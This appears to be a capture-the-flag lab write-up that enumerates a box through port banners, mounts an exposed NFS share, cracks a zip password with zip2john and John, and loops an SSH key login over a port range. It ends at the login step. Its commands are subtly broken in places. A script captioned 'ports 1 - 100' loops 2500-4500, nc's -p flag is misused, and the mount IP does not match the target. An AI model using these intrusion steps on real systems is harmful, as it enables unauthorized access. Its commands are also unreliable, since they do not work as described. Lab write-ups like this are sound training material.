# SERVER FROM HELL WRITEUP
#### Author: DeadPackets

## [Task 1] Flag.txt | "Start at port 1337 and enumerate your way."
#### First connect to port 1337 with nc
```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says hes hiding on the first 100 ports
Try printing the banners from the ports
```

### Write a simple script to connect from ports 1 - 100:
```bash
#!/bin/bash
for port in {2500..4500}
do
    nc 10.10.10.10 -p $port
done
```
### Output of port 12345
```
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```
### NFS runs on port 2049
```
command:
showmount -e 10.10.10.10

output:
Export list for 10.10.10.10:
/home/nfs *
```
### Then just simply mount it
```
sudo mount -t nfs 10.10.0.10:/home/nfs /var/backups
```
### There is a file named backup.zip
#### But its password protected
```
zip2john backup.zip > hash
john hash -w ~/wordlists/rockyou.txt
```
### Once you've uncompressed the zip, we can see that it's hades's home directory
#### Output:
```
authorized_keys  flag.txt  hint.txt  id_rsa  id_rsa.pub
```
### Nice, we have an id_rsa key
##### The problem now is that we don't know which port ssh is running on, lets check the hint.
```
output:
2500-4500
```
#### this is probably refering the to range of ports that ssh is running on
#### lets modify our script
```bash
#!/bin/bash
for port in {2500..4500}
do
    ssh -i id_rsa hades@10.10.10.10 -p $port
done
```
### Now we just wait until we get a login prompt




